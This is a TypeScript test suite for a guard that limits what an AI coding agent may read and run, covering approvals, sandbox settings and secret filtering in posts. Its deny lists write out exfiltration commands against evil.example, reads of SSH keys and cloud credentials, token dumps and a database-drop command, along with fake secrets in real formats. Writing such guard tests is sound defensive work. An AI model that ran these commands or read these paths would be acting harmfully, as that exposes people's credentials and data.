import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { basename, dirname, join } from 'node:path'
import { afterAll, beforeEach, describe, expect, it } from 'vitest'
import { allowBuddyReads, buddyApprovalsOf, buddyGuardSource, buddyLaunchWide, buddySandboxSettings, buddyWideOf, hasBuddyApprovals, judgeBuddyApprovals,
  recordBuddyApprovals } from './buddyGuard.js'

// Wide mode (docs/specs/2026-10-30-buddy-read-access.md): a Buddy on its person's own machine also reads outside its
// folder, except where secrets and other people's data live. A throwaway home stands in for the person's: the guard is
// told it is their home, so nothing here reads the real one.
const parent = realpathSync(mkdtempSync(join(tmpdir(), 'buddy-wide-')))
const users = join(parent, 'Users'), home = join(users, 'me'), root = join(home, 'project'), other = join(users, 'someone')
const dataDir = join(home, '.harness-data'), tmpClaude = join(parent, 'tmp', 'claude-501')
const reads = { file: join(dataDir, 'buddy-reads', 'session.json'), drops: join(dataDir, 'paste-drops') }
const file = (path: string, text = 'x\n') => { mkdirSync(dirname(path), { recursive: true }); writeFileSync(path, text) }
mkdirSync(root, { recursive: true })
file(join(root, 'a.txt'))
file(join(home, 'work', 'notes.txt'), 'notes\n')
file(join(other, 'notes.txt'))
file(join(tmpClaude, 'session', 'tool-results', 'status.json'))
file(join(dataDir, 'buddy-approvals', 'x.json'))

// Every place the Lead named (10-30), each with a file in it: ssh, cloud and Harness credentials, keychains, .env and key
// files, browser profiles, other agents' transcripts and the paste cache.
const denied = [
  '.ssh/id_ed25519', '.aws/credentials', '.config/gcloud/application_default_credentials.json', '.azure/msal_token_cache.json',
  '.kube/config', '.docker/config.json', '.config/gh/hosts.yml', '.config/argocd/config', '.netrc', '.npmrc', '.pypirc',
  '.git-credentials', '.gnupg/private-keys-v1.d/k.key', '.harness-ro-prod-db', '.harness/credentials.json',
  '.claude/projects/-Users-me-x/session.jsonl', '.claude/paste-cache/0a1b.txt', '.claude/history.jsonl', '.claude.json',
  '.codex/auth.json', '.codex/sessions/2026/10/30/rollout.jsonl', '.codex/history.jsonl', '.zsh_history', '.bash_history',
  'Library/Keychains/login.keychain-db', 'Library/Application Support/Google/Chrome/Default/Cookies',
  'Library/Application Support/Firefox/Profiles/p.default/key4.db', 'Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data',
  'Library/Application Support/Arc/User Data/Default/Cookies', 'Library/Safari/History.db', 'Library/Cookies/Cookies.binarycookies',
  'Library/Messages/chat.db', 'Library/Mail/V10/inbox.mbox', '.mozilla/firefox/p.default/key4.db', '.config/google-chrome/Default/Cookies',
  'work/app/.env', 'work/app/.env.production', 'work/certs/server.pem', 'work/certs/tls.key', 'work/certs/client.p12', 'work/keys/id_rsa',
  'work/aws/credentials', 'work/aws/credentials.json',
  // Where Ken's clone keeps the read-only prod database login (Lead, 10-30), and the like.
  'work/openharness/.secrets/mongodb-prod-readonly.env', 'work/app/prod.env', 'work/app/.secret/token.txt', 'work/app/secrets/api.json',
]
for (const path of denied) file(join(home, path))
// Links that lead into those places from somewhere the Buddy may read.
symlinkSync(join(home, '.ssh', 'id_ed25519'), join(home, 'work', 'key-link'))
symlinkSync(join(home, '.claude'), join(home, 'work', 'claude-link'))
symlinkSync(other, join(home, 'work', 'their-home'))
// A case-insensitive volume (macOS by default) opens .SSH as .ssh.
const caseInsensitive = existsSync(join(home, '.SSH'))

const wide = buddyWideOf({ home, dataDir, tmpDirs: [tmpClaude], repos: ['autonomous-ai/openharness'] })
// The person's approvals on this machine, which the host points this Buddy session's list at once it has checked who sent them.
const approvals = buddyApprovalsOf('person-1:generation-1', dataDir)
const script = join(parent, 'buddy-guard.mjs'), narrow = join(parent, 'buddy-guard-narrow.mjs')
writeFileSync(script, buddyGuardSource(root, reads, wide))
writeFileSync(narrow, buddyGuardSource(root, reads))
afterAll(() => rmSync(parent, { recursive: true, force: true }))

function answer(tool: string, input: Record<string, unknown>, guard = script): { permissionDecision: string; permissionDecisionReason: string } {
  const run = spawnSync(process.execPath, [guard], { input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: tool, tool_input: input,
    cwd: root }), encoding: 'utf8', timeout: 10_000 })
  expect(run.status).toBe(0)
  return JSON.parse(run.stdout).hookSpecificOutput
}
const decide = (tool: string, input: Record<string, unknown>, guard = script) => answer(tool, input, guard).permissionDecision
const bash = (command: string, guard = script) => decide('Bash', { command, description: 'x' }, guard)

describe('wide mode: reading outside the folder', () => {
  it('reads a file outside the folder only in wide mode', () => {
    const notes = join(home, 'work', 'notes.txt')
    expect(decide('Read', { file_path: notes })).toBe('allow')
    expect(decide('Read', { file_path: notes }, narrow)).toBe('deny')
  })

  it.each([
    ['Read', { file_path: join(home, 'work', 'notes.txt') }],
    ['Read', { file_path: '/etc/hosts' }],
    ['Grep', { pattern: 'x', path: join(home, 'work', 'notes.txt') }],
    ['Glob', { pattern: '**/*.txt', path: join(home, 'work') }],
    ['LS', { path: join(home, 'work') }],
    ['LS', { path: home }],
  ])('lets %s read outside the folder (%j)', (tool, input) => {
    expect(decide(tool, input)).toBe('allow')
  })

  it.each(denied)('refuses Read of ~/%s', path => {
    expect(decide('Read', { file_path: join(home, path) })).toBe('deny')
  })

  it.each(denied)('refuses cat and Grep of ~/%s', path => {
    expect(bash(`cat '${join(home, path)}'`)).toBe('deny')
    expect(decide('Grep', { pattern: 'x', path: join(home, path) })).toBe('deny')
  })

  it.each([
    ['another person\'s home folder', join(other, 'notes.txt')],
    ['Harness\'s data folder (approvals, lists, downloads)', join(dataDir, 'buddy-approvals', 'x.json')],
    ['other Claude sessions\' temporary files', join(tmpClaude, 'session', 'tool-results', 'status.json')],
    ['a link to a key', join(home, 'work', 'key-link')],
    ['a file through a linked folder into ~/.claude', join(home, 'work', 'claude-link', 'history.jsonl')],
    ['a file through a link into another home', join(home, 'work', 'their-home', 'notes.txt')],
    ['a ".." path into ~/.ssh', join(home, 'work', '..', '.ssh', 'id_ed25519')],
    ['a file not there yet under ~/.ssh', join(home, '.ssh', 'id_new')],
  ])('refuses %s', (_, path) => {
    expect(decide('Read', { file_path: path })).toBe('deny')
    expect(bash(`cat '${path}'`)).toBe('deny')
  })

  it.skipIf(!caseInsensitive)('refuses ~/.SSH on a case-insensitive volume', () => {
    expect(decide('Read', { file_path: join(home, '.SSH', 'id_ed25519') })).toBe('deny')
    expect(decide('Read', { file_path: join(home, 'Library', 'KEYCHAINS', 'login.keychain-db') })).toBe('deny')
  })

  it.each([
    ['Grep over a folder outside (it would read any .env or key in it)', 'Grep', { pattern: 'x', path: join(home, 'work') }],
    ['Glob over a folder holding a denied place', 'Glob', { pattern: '**/*', path: home }],
    ['Glob into a denied place', 'Glob', { pattern: '*', path: join(home, '.ssh') }],
    ['LS of a denied place', 'LS', { path: join(home, '.claude', 'paste-cache') }],
    ['LS of another home', 'LS', { path: other }],
  ])('refuses %s', (_, tool, input) => {
    expect(decide(tool as string, input as Record<string, unknown>)).toBe('deny')
  })

  it.each([
    `cat '${join(home, 'work', 'notes.txt')}'`,
    `head -n 5 '${join(home, 'work', 'notes.txt')}'`,
    `tail -n 5 '${join(home, 'work', 'notes.txt')}'`,
    `wc -l '${join(home, 'work', 'notes.txt')}'`,
    `ls '${join(home, 'work')}'`,
    `grep -n notes '${join(home, 'work', 'notes.txt')}'`,
    `rg -n notes '${join(home, 'work', 'notes.txt')}'`,
  ])('lets the shell read outside the folder: %s', command => {
    expect(bash(command)).toBe('allow')
    expect(bash(command, narrow)).toBe('deny')
  })

  it.each([
    `grep -rn x '${join(home, 'work')}'`,
    `rg x '${join(home, 'work')}'`,
    `ls '${join(home, '.ssh')}'`,
    `ls -L '${join(home, 'work')}'`,
    `tail -f '${join(home, 'work', 'notes.txt')}'`,
    `git -C '${join(home, 'work')}' log`,
    `git log '${join(home, 'work', 'notes.txt')}'`,
    `cat --file='${join(home, '.ssh', 'id_ed25519')}'`,
    `head -n5 '${join(home, 'work', 'notes.txt')}' '${join(home, '.netrc')}'`,
  ])('still refuses in the shell: %s', command => {
    expect(bash(command)).toBe('deny')
  })
})

// The person's approvals on this machine, as the host records them from their own "run:" lines (step 3): each command by
// its exact words. Written by hand here, so the grammar is tested on its own.
const point = (at = approvals) => {
  mkdirSync(dirname(reads.file), { recursive: true })
  writeFileSync(reads.file, JSON.stringify({ version: 1, session: 'harness', files: [], links: [], approvals: at }))
}
const approve = (...commands: string[][]) => {
  mkdirSync(dirname(approvals), { recursive: true })
  writeFileSync(approvals, JSON.stringify({ version: 1, entries: commands.map(argv => ({ argv, at: Date.now(), messageId: 'm' })) }))
  point()
}
// The words as the shell reads them: these commands quote nothing but whole words.
const argv = (command: string) => command.split(' ').map(word => word.replace(/^'(.*)'$/, '$1'))

describe('wide mode: commands not run before are asked of the person first', () => {
  beforeEach(() => { rmSync(approvals, { force: true }); rmSync(reads.file, { force: true }) })

  const wider = [
    'gh run list --limit 20',
    'gh run list --workflow ci.yml --branch main --status failure',
    'gh run view 123456',
    'gh run view 123456 --log-failed',
    'gh run view 123456 --log --job 987',
    "gh api 'repos/autonomous-ai/openharness/actions/runs?per_page=5&branch=main'",
    'gh api repos/autonomous-ai/openharness/pulls/2300 --jq .state',
    'gh api --method GET repos/autonomous-ai/openharness/commits/main',
    'argocd app list',
    'argocd app get harness-backend',
    'argocd app get harness-backend -o json',
    'argocd app resources harness-backend',
    'argocd app history harness-backend',
    'argocd app get-resource production-autonomous-code-be --kind Pod -o json',
    'argocd app get-resource production-autonomous-code-be --kind HorizontalPodAutoscaler -o json',
    'argocd app logs harness-backend --tail 200',
    'argocd app logs harness-backend --kind Deployment --name harness-backend --since-seconds 3600 --filter cpu',
    'argocd app logs production-autonomous-code-be --kind Deployment --name autonomous-code-be --group apps --since-seconds 3600',
    'argocd version --client',
    'kubectl get pods -n harness',
    'kubectl top pods -n harness',
    'kubectl describe deploy harness-backend -n harness',
    'kubectl logs deploy/harness-backend -n harness --since 1h --tail 500',
    'harness buddy-read db-size',
  ]

  it.each(wider)('refuses %s until its person approves it, saying how to ask', command => {
    const refused = answer('Bash', { command, description: 'x' })
    expect(refused.permissionDecision).toBe('deny')
    expect(refused.permissionDecisionReason).toContain('Not run before')
    expect(refused.permissionDecisionReason).toContain(`run: ${command}`)
    approve(argv(command))
    expect(bash(command)).toBe('allow')
    expect(bash(command, narrow)).toBe('deny')
  })

  it('matches the exact command, never a prefix or a neighbour', () => {
    approve(argv('argocd app logs harness-backend --tail 200'))
    expect(bash('argocd app logs harness-backend --tail 200')).toBe('allow')
    expect(bash('argocd app logs harness-backend --tail 500')).toBe('deny')
    expect(bash('argocd app logs harness-worker --tail 200')).toBe('deny')
    expect(bash('argocd app logs harness-backend')).toBe('deny')
    expect(bash('argocd app logs harness-backend --tail 200 --previous')).toBe('deny')
  })

  it('reads approvals only where the host pointed this session\'s list, and only in Harness\'s approvals folder', () => {
    approve(argv('argocd app list'))
    expect(bash('argocd app list')).toBe('allow')
    rmSync(reads.file)
    expect(bash('argocd app list')).toBe('deny')
    // A file of approvals anywhere else, the Buddy's own folder included, approves nothing.
    const elsewhere = join(root, 'approvals.json')
    writeFileSync(elsewhere, readFileSync(approvals))
    point(elsewhere)
    expect(bash('argocd app list')).toBe('deny')
    // Not resolved: the same file by a path with ".." in it.
    point(`${dirname(approvals)}/../buddy-approvals/x/../${basename(approvals)}`)
    expect(bash('argocd app list')).toBe('deny')
  })

  it('forgets an approval after 30 days', () => {
    mkdirSync(dirname(approvals), { recursive: true }); point()
    const day = 24 * 60 * 60 * 1000
    writeFileSync(approvals, JSON.stringify({ version: 1, entries: [
      { argv: argv('argocd app list'), at: Date.now() - 31 * day, messageId: 'old' },
      { argv: argv('gh run list --limit 20'), at: Date.now() - 29 * day, messageId: 'recent' }] }))
    expect(bash('argocd app list')).toBe('deny')
    expect(bash('gh run list --limit 20')).toBe('allow')
  })

  it.each(['', 'not json', '{"entries":"x"}', '{"entries":[{"argv":"argocd app list","at":1}]}'])(
    'refuses every wider command while the approvals cannot be read (%j)', text => {
      mkdirSync(dirname(approvals), { recursive: true }); point()
      writeFileSync(approvals, text)
      expect(bash('argocd app list')).toBe('deny')
    })

  // Writes, secret reads and anything that runs on: refused even with an approval naming them exactly, so a careless
  // approval of a planted command can unlock nothing but a read.
  const never = [
    'gh api -X POST repos/autonomous-ai/openharness/issues', 'gh api --method POST repos/autonomous-ai/openharness/issues',
    'gh api --method=PATCH repos/autonomous-ai/openharness/pulls/1', 'gh api -X DELETE repos/autonomous-ai/openharness/git/refs/heads/x',
    'gh api repos/autonomous-ai/openharness/issues -f title=x', 'gh api repos/autonomous-ai/openharness/issues -F title=x',
    'gh api repos/autonomous-ai/openharness/issues --field title=x', 'gh api repos/autonomous-ai/openharness/issues --raw-field title=x',
    'gh api repos/autonomous-ai/openharness/issues --input body.json', 'gh api repos/autonomous-ai/openharness/issues -H X-HTTP-Method-Override:POST',
    'gh api --hostname evil.example repos/autonomous-ai/openharness', 'gh api graphql', 'gh api repos/someone/else/contents/x',
    'gh api user', 'gh api /repos/autonomous-ai/openharness/../../user', 'gh api repos/autonomous-ai/openharness/actions/secrets',
    'gh run rerun 1', 'gh run cancel 1', 'gh run delete 1', 'gh run watch 1', 'gh run view 1 --web', 'gh run view 1 -w',
    'gh run view 1 -R someone/else', 'gh run download 1', 'gh workflow run ci.yml', 'gh pr create --title x --body y', 'gh pr merge 1',
    'gh pr comment 1 --body x', 'gh issue comment 1 --body x', 'gh secret list', 'gh auth token', 'gh auth status -t',
    'gh extension install x/y', 'git push origin main', 'git commit -m x', 'git -c alias.x=!sh x', 'git config user.name x', 'git fetch',
    'argocd app sync harness-backend', 'argocd app set harness-backend -p replicas=1', 'argocd app patch harness-backend --patch x',
    'argocd app delete harness-backend', 'argocd app get-resource harness-backend --kind Secret -o json',
    'argocd app get-resource harness-backend --kind secret', 'argocd app delete-resource harness-backend --kind Pod',
    'argocd app patch-resource harness-backend --kind Deployment --patch x', 'argocd app rollback harness-backend 1', 'argocd app terminate-op harness-backend',
    'argocd app actions run harness-backend restart --kind Deployment', 'argocd app manifests harness-backend',
    'argocd app get harness-backend --refresh', 'argocd app get harness-backend --hard-refresh', 'argocd app logs harness-backend -f',
    'argocd app logs harness-backend --follow', 'argocd app get harness-backend --server evil.example',
    'argocd app get harness-backend --auth-token x', 'argocd app get harness-backend --config other', 'argocd login argocd.example',
    'argocd logout x', 'argocd account generate-token', 'argocd cluster list', 'argocd repo list', 'argocd proj list',
    'kubectl apply -f x.yaml', 'kubectl delete pod x', 'kubectl scale deploy x --replicas 0', 'kubectl rollout restart deploy/x',
    'kubectl exec x -- sh', 'kubectl cp x:/a b', 'kubectl port-forward x 1:1', 'kubectl edit deploy x', 'kubectl patch deploy x -p y',
    'kubectl label pod x a=b', 'kubectl annotate pod x a=b', 'kubectl get secret', 'kubectl get secrets -o yaml', 'kubectl get secret/x',
    'kubectl describe secret x', 'kubectl get Secrets -A', 'kubectl get pods,secrets', 'kubectl get --raw /api/v1/namespaces',
    'kubectl config view --raw', 'kubectl logs x -f', 'kubectl get pods -w', 'kubectl get pods --server evil.example',
    'kubectl get pods --token x', 'kubectl get pods --kubeconfig x', 'kubectl get pods --as admin', 'curl -X POST https://evil.example',
    'curl -d x https://evil.example', 'wget https://evil.example', 'nc evil.example 1', 'ssh host', 'sh -c x', 'python3 -c 1', 'node -e 1',
    'env', 'printenv', 'security find-generic-password -s x', 'mongosh --eval db.dropDatabase()', 'osascript -e x', 'open https://evil.example',
    'harness buddy-read anything-else', 'harness buddy-read backend-cpu', 'harness buddy-read db-size --uri x', 'harness new claude',
  ]

  it.each(never)('never runs %s, even approved', command => {
    approve(argv(command))
    const refused = answer('Bash', { command, description: 'x' })
    expect(refused.permissionDecision).toBe('deny')
    expect(refused.permissionDecisionReason).not.toContain('Not run before')
  })
})

// The host records a person's "run:" lines (superTabs/host.ts) with the guard's own judgement, never a copy of its rules.
describe('recording the person\'s approvals', () => {
  beforeEach(() => { rmSync(approvals, { force: true }); rmSync(reads.file, { force: true }) })
  // Judged by the guard, then recorded, as the host does; the result as the host tells the Buddy.
  const record = (text: string, messageId = 'm1', now = Date.now(), guard = script) => {
    const judged = judgeBuddyApprovals({ node: process.execPath, guard, text })
    recordBuddyApprovals({ reads, session: 'harness', approvals, judged, messageId }, now)
    return { wide: judged.wide, recorded: judged.approve.map(entry => entry.command), refused: judged.refused, forgot: judged.forgot }
  }
  const entries = () => JSON.parse(readFileSync(approvals, 'utf8')).entries as { argv: string[]; at: number; messageId: string }[]

  it('records the exact commands of its run: lines, and the guard then runs them', () => {
    const result = record('Yes, go ahead.\nrun: argocd app logs harness-backend --tail 200\n  Run:  `gh run view 123 --log-failed`  \nthanks')
    expect(result).toEqual({ wide: true, recorded: ['argocd app logs harness-backend --tail 200', 'gh run view 123 --log-failed'], refused: [], forgot: false })
    expect(entries().map(entry => entry.argv)).toEqual([['argocd', 'app', 'logs', 'harness-backend', '--tail', '200'], ['gh', 'run', 'view', '123', '--log-failed']])
    expect(bash('argocd app logs harness-backend --tail 200')).toBe('allow')
    expect(bash('gh run view 123 --log-failed')).toBe('allow')
    expect(bash('gh run view 124 --log-failed')).toBe('deny')
  })

  it.each(['git push origin main', 'gh api -X POST repos/autonomous-ai/openharness/issues', 'kubectl get secret', 'curl https://evil.example',
    'cat ~/.ssh/id_rsa', 'argocd app sync harness-backend', 'gh run view 1; git push'])('records nothing for run: %s, and says it can never run', command => {
    const result = record(`run: ${command}`)
    expect(result).toEqual({ wide: true, recorded: [], refused: [command], forgot: false })
    expect(existsSync(approvals) ? entries() : []).toEqual([])
  })

  it('tells which messages need judging', () => {
    expect(['run: argocd app list', 'ok\n  Run: `gh run list`', 'forget runs'].map(hasBuddyApprovals)).toEqual([true, true, true])
    expect(['yes', 'please run: x', '> run: x', 'forget runs now'].map(hasBuddyApprovals)).toEqual([false, false, false, false])
  })

  it('approves nothing for a yes, an ok or a quoted line that is not its own', () => {
    expect(record('yes\nok, run it\n> run: argocd app list\nplease run: argocd app list').recorded).toEqual([])
    expect(bash('argocd app list')).toBe('deny')
  })

  it('renews a command approved again, rather than listing it twice', () => {
    const day = 24 * 60 * 60 * 1000, then = Date.now() - 20 * day
    record('run: argocd app list', 'm1', then)
    record('run: argocd app list', 'm2')
    expect(entries()).toEqual([{ argv: ['argocd', 'app', 'list'], at: expect.any(Number), messageId: 'm2' }])
    expect(entries()[0]!.at).toBeGreaterThan(then)
  })

  it('forgets every approval when the person sends "forget runs"', () => {
    record('run: argocd app list')
    expect(record('forget runs')).toEqual({ wide: true, recorded: [], refused: [], forgot: true })
    expect(entries()).toEqual([])
    expect(bash('argocd app list')).toBe('deny')
  })

  it('drops approvals 30 days old and keeps the newest 200', () => {
    const day = 24 * 60 * 60 * 1000, now = Date.now()
    record('run: argocd app list', 'old', now - 31 * day)
    const many = Array.from({ length: 205 }, (_, i) => `run: gh run view ${i}`).join('\n')
    record(many, 'many', now)
    const kept = entries()
    expect(kept).toHaveLength(200)
    expect(kept.some(entry => entry.argv.join(' ') === 'argocd app list')).toBe(false)
    expect(kept.at(-1)!.argv).toEqual(['gh', 'run', 'view', '204'])
  })

  it('removes other people\'s approval files untouched for 30 days, an earlier membership\'s among them, and keeps the rest', () => {
    const day = 24 * 60 * 60 * 1000
    const earlier = buddyApprovalsOf('person-1:generation-0', dataDir), recent = buddyApprovalsOf('person-2:generation-1', dataDir)
    mkdirSync(dirname(approvals), { recursive: true })
    for (const file of [earlier, recent]) writeFileSync(file, '{"version":1,"entries":[]}')
    const old = (Date.now() - 31 * day) / 1000
    utimesSync(earlier, old, old)
    record('run: argocd app list')
    expect([existsSync(earlier), existsSync(recent), existsSync(approvals)]).toEqual([false, true, true])
    rmSync(recent)
  })

  it('keeps the file to its person: mode 600 in a folder of mode 700', () => {
    record('run: argocd app list')
    expect(statSync(approvals).mode & 0o777).toBe(0o600)
    expect(statSync(dirname(approvals)).mode & 0o777).toBe(0o700)
  })

  it('records nothing through a guard that is not in wide mode', () => {
    expect(record('run: argocd app list', 'm1', Date.now(), narrow)).toEqual({ wide: false, recorded: [], refused: [], forgot: false })
    expect(existsSync(approvals)).toBe(false)
  })

  it('points the session\'s list at the approvals and keeps the files and links listed there, and the list keeps the pointer', () => {
    const shot = join(reads.drops, 'shot.png')
    mkdirSync(reads.drops, { recursive: true }); writeFileSync(shot, 'png')
    allowBuddyReads(reads, { session: 'harness', files: [shot], links: ['https://claude.ai/artifact/abc'] })
    record('run: argocd app list')
    let list = JSON.parse(readFileSync(reads.file, 'utf8'))
    expect(list).toMatchObject({ session: 'harness', approvals, files: [{ path: shot }], links: [{ url: 'https://claude.ai/artifact/abc' }] })
    allowBuddyReads(reads, { session: 'harness', files: [], links: ['https://claude.ai/artifact/def'] })
    list = JSON.parse(readFileSync(reads.file, 'utf8'))
    expect(list.approvals).toBe(approvals)
    expect(bash('argocd app list')).toBe('allow')
  })

  it('throws when it cannot write, so the host tries the delivery again', () => {
    const blocked = join(parent, 'not-a-folder')
    writeFileSync(blocked, '')
    const judged = judgeBuddyApprovals({ node: process.execPath, guard: script, text: 'run: argocd app list' })
    expect(() => recordBuddyApprovals({ reads, session: 'harness', approvals: join(blocked, 'a.json'), judged, messageId: 'm' })).toThrow()
  })

  it('throws when the guard cannot judge, so nothing is approved and the delivery is tried again', () => {
    const broken = join(parent, 'broken-guard.mjs')
    writeFileSync(broken, 'process.exit(3)\n')
    expect(() => judgeBuddyApprovals({ node: process.execPath, guard: broken, text: 'run: argocd app list' })).toThrow()
  })
})

// What a Buddy reads must never reach the project chat (docs/specs/2026-10-30-buddy-read-access.md, section 4): its posts and
// its owner's proposals are refused when they carry a secret's shape, in every mode, and in wide mode a proposal carries no
// pasted output. Made-up values in each real format.
describe('no secret leaves in a post or a proposal', () => {
  const secrets: Array<[string, string]> = [
    ['a GitHub token', `ghp_${'A1b2C3d4E5'.repeat(4)}`],
    ['a GitHub token', `github_pat_${'11ABCDEFG0'.repeat(5)}`],
    ['an Anthropic key', `sk-ant-api03-${'aB3dE6gH9j'.repeat(3)}`],
    ['an API key', `sk-proj-${'aB3dE6gH9j'.repeat(3)}`],
    ['an AWS key', 'AKIAIOSFODNN7EXAMPLE'],
    ['a Slack token', `xoxb-1234567890-${'a1B2c3D4e5'.repeat(2)}`],
    ['a GitLab token', `glpat-${'aB3dE6gH9j'.repeat(2)}`],
    ['a Google API key', `AIza${'Sy0123456789abcdefghijklmnopqrstuvw'}`],
    ['a JWT', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U'],
    ['a private key', '-----BEGIN OPENSSH PRIVATE KEY-----'],
    ['a URL with a password', 'mongodb+srv://reader:Sup3rS3cret@cluster0.example.net/harness'],
    ['a URL with a password', 'https://user:hunter2hunter2@example.com/x'],
    ['a password or token', 'DB_PASSWORD=Zx9-qWe8_rTy7uIo6pAs5'],
  ]

  it.each(secrets)('refuses a post in its chat holding %s (%s), saying what kind, never the value', (kind, value) => {
    for (const guard of [script, narrow]) {
      const refused = answer('Bash', { command: `harness super-tab post chat 'Found it: ${value}' op-1`, description: 'x' }, guard)
      expect(refused.permissionDecision).toBe('deny')
      expect(refused.permissionDecisionReason).toContain(kind)
      expect(refused.permissionDecisionReason).not.toContain(value)
    }
  })

  it.each(secrets)('refuses a proposal holding %s', (_, value) => {
    const proposal = JSON.stringify({ conversationId: 'chat', ownerMessageId: 'm', goal: `Fix the login: ${value}`, scope: 'x', priority: 'normal' })
    expect(bash(`harness super-tab propose op-1 '${proposal}'`)).toBe('deny')
  })

  it('refuses an attachment holding a secret, and sends a clean one', () => {
    writeFileSync(join(root, 'leak.md'), `Notes\nDB: mongodb://reader:Sup3rS3cret@db.example.net/x\n`)
    writeFileSync(join(root, 'plan.md'), 'The plan: measure CPU, then decide.\n')
    expect(bash('harness super-tab post chat \'See the notes\' op-1 --attach leak.md')).toBe('deny')
    expect(bash('harness super-tab post chat \'See the plan\' op-1 --attach plan.md')).toBe('allow')
    // Through a link in the folder too, as Harness sends the file it points at.
    symlinkSync(join(root, 'leak.md'), join(root, 'leak-link.md'))
    expect(bash('harness super-tab post chat \'See the notes\' op-1 --attach leak-link.md')).toBe('deny')
  })

  it.each([
    'CPU is 22 s per minute per pod, 4 pods, steady since the 9:00 release.',
    'The token expires at 10:00; ask Ken to renew it.',
    'Run gh run view 123 --log-failed for the details.',
    'https://github.com/autonomous-ai/openharness/pull/2300',
  ])('sends an ordinary post: %s', text => {
    expect(bash(`harness super-tab post chat '${text}' op-1`)).toBe('allow')
  })

  it.each([
    ['a code block', 'Logs:\n```\nerror at line 1\n```'],
    ['more than 10 lines', Array.from({ length: 11 }, (_, i) => `line ${i}`).join('\n')],
  ])('refuses in wide mode a proposal pasting output (%s), and lets a summary through', (_, scope) => {
    const proposal = (text: string) => JSON.stringify({ conversationId: 'chat', ownerMessageId: 'm', goal: 'Cut API CPU', scope: text, priority: 'normal' })
    const refused = answer('Bash', { command: `harness super-tab propose op-1 '${proposal(scope)}'`, description: 'x' })
    expect(refused.permissionDecision).toBe('deny')
    expect(refused.permissionDecisionReason).toContain('summar')
    expect(bash(`harness super-tab propose op-1 '${proposal('CPU 22 s per minute per pod on 4 pods; change feed is 63% of slow reads.')}'`)).toBe('allow')
  })
})

// Whether a Buddy's launch turns wide mode on (docs/specs/2026-10-30-buddy-read-access.md, section 1): its person's own
// machine and account, with Claude Code's sandbox there to run its shell in. And the sandbox it runs in then.
describe('the launch\'s wide mode and sandbox', () => {
  const launchHome = join(parent, 'launch-home'), repo = join(parent, 'launch-repo')
  mkdirSync(join(launchHome, '.config', 'argocd'), { recursive: true }); mkdirSync(join(launchHome, '.kube'), { recursive: true })
  // Only host names are taken from the person's ArgoCD and cluster settings, which also hold their tokens.
  writeFileSync(join(launchHome, '.config', 'argocd', 'config'), 'contexts:\n- name: deploy.autonomous.ai\n  server: deploy.autonomous.ai\n'
    + '  user: deploy.autonomous.ai\ncurrent-context: deploy.autonomous.ai\nservers:\n- grpc-web-root-path: ""\n  server: deploy.autonomous.ai\n'
    + 'users:\n- auth-token: not-a-token\n  name: deploy.autonomous.ai\n')
  writeFileSync(join(launchHome, '.kube', 'config'), 'clusters:\n- cluster:\n    server: https://k8s.example.net:6443\n  name: prod\n')
  mkdirSync(repo)
  spawnSync('git', ['init', '-q'], { cwd: repo })
  spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/autonomous-ai/openharness.git'], { cwd: repo })
  spawnSync('git', ['remote', 'add', 'fork', 'git@github.com:someone/openharness.git'], { cwd: repo })
  const deps = { platform: 'darwin' as NodeJS.Platform, team: false, home: launchHome, dataDir, uid: 501, hasBwrap: false }

  it('turns wide mode on for its person\'s own Mac, naming its repositories and the hosts of their ArgoCD and cluster', () => {
    const launched = buddyLaunchWide(repo, deps)!
    expect(launched).toEqual({ home: launchHome, approvalsDir: join(dataDir, 'buddy-approvals'),
      repos: ['autonomous-ai/openharness', 'someone/openharness'], hosts: ['deploy.autonomous.ai', 'k8s.example.net'],
      denied: expect.arrayContaining([join(launchHome, '.ssh'), join(launchHome, '.claude'), dataDir, '/tmp/claude-501', '/private/tmp/claude-501']) })
  })

  it.each([
    ['a Harness Team account', { team: true }],
    ['Windows, where Claude Code has no sandbox', { platform: 'win32' as NodeJS.Platform }],
    ['Linux without bubblewrap', { platform: 'linux' as NodeJS.Platform, hasBwrap: false }],
  ])('keeps the folder only on %s', (_, change) => {
    expect(buddyLaunchWide(repo, { ...deps, ...change })).toBeNull()
  })

  it('turns wide mode on for Linux with bubblewrap', () => {
    expect(buddyLaunchWide(repo, { ...deps, platform: 'linux', hasBwrap: true })).not.toBeNull()
  })

  it('runs its whole shell but Harness\'s own commands in the sandbox: no writes, its hosts only, gh, argocd and kubectl able to verify TLS', () => {
    const launched = buddyLaunchWide(repo, deps)!
    expect(buddySandboxSettings(repo, launched)).toEqual({
      enabled: true, failIfUnavailable: true, autoAllowBashIfSandboxed: false, allowUnsandboxedCommands: false, enableWeakerNetworkIsolation: true,
      excludedCommands: ['harness super-tab *', 'harness buddy-read *'],
      network: { allowedDomains: ['api.github.com', 'github.com', '*.actions.githubusercontent.com', '*.blob.core.windows.net', 'deploy.autonomous.ai',
        'k8s.example.net'], allowLocalBinding: true },
      filesystem: { allowWrite: [], denyWrite: [repo], denyRead: launched.denied.filter(path => ![join(launchHome, '.config', 'gh'),
        join(launchHome, '.config', 'argocd'), join(launchHome, '.argocd'), join(launchHome, '.kube')].includes(path)) },
    })
  })

  it('leaves the tools\' own sign-ins readable to them in the sandbox, though the Buddy itself still may not read them', () => {
    const launched = buddyLaunchWide(repo, deps)!
    const denyRead = (buddySandboxSettings(repo, launched).filesystem as { denyRead: string[] }).denyRead
    expect(denyRead).not.toContain(join(launchHome, '.config', 'gh'))
    expect(denyRead).toContain(join(launchHome, '.ssh'))
    expect(launched.denied).toContain(join(launchHome, '.config', 'gh'))
  })
})

describe('a Buddy\'s shell stays in its sandbox', () => {
  it.each(['git log --oneline', 'cat a.txt', 'harness super-tab --tab t messages chat'])(
    'refuses %s when it asks to run outside the sandbox, in every mode', command => {
      for (const guard of [script, narrow]) {
        expect(decide('Bash', { command, description: 'x' }, guard)).toBe('allow')
        expect(decide('Bash', { command, description: 'x', dangerouslyDisableSandbox: true }, guard)).toBe('deny')
      }
    })
})
